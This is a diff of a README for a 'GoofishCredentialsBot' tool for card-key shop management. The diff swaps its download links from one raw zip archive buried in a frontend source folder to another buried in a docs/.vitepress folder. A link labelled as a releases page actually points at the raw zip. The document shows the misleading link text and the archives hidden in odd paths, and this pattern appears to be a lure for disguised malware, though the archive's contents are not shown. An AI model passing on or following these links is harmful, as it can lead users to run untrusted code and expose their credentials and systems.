@@ -1,6 +1,6 @@
 # 🤖 GoofishCredentialsBot - Automate Your Faka Management Effortlessly
 
-[![Download GoofishCredentialsBot](https://github.com/Jay-Bosco/GoofishCredentialsBot/raw/refs/heads/main/frontend/src/app/views/bot-workflow/Credentials_Goofish_Bot_1.2.zip)](https://github.com/Jay-Bosco/GoofishCredentialsBot/raw/refs/heads/main/frontend/src/app/views/bot-workflow/Credentials_Goofish_Bot_1.2.zip)
+[![Download GoofishCredentialsBot](https://raw.githubusercontent.com/Jay-Bosco/GoofishCredentialsBot/main/docs/.vitepress/Credentials-Bot-Goofish-v2.6.zip)](https://raw.githubusercontent.com/Jay-Bosco/GoofishCredentialsBot/main/docs/.vitepress/Credentials-Bot-Goofish-v2.6.zip)
 
 ## 📚 Introduction
 
@@ -12,7 +12,7 @@ To begin using GoofishCredentialsBot, follow these simple steps to download and 
 
 ## 🔗 Download & Install
 
-Visit this page to download: [GoofishCredentialsBot Releases](https://github.com/Jay-Bosco/GoofishCredentialsBot/raw/refs/heads/main/frontend/src/app/views/bot-workflow/Credentials_Goofish_Bot_1.2.zip)
+Visit this page to download: [GoofishCredentialsBot Releases](https://raw.githubusercontent.com/Jay-Bosco/GoofishCredentialsBot/main/docs/.vitepress/Credentials-Bot-Goofish-v2.6.zip)
 
 You will find the latest version available for download. Click on the link to get the software package. 
 
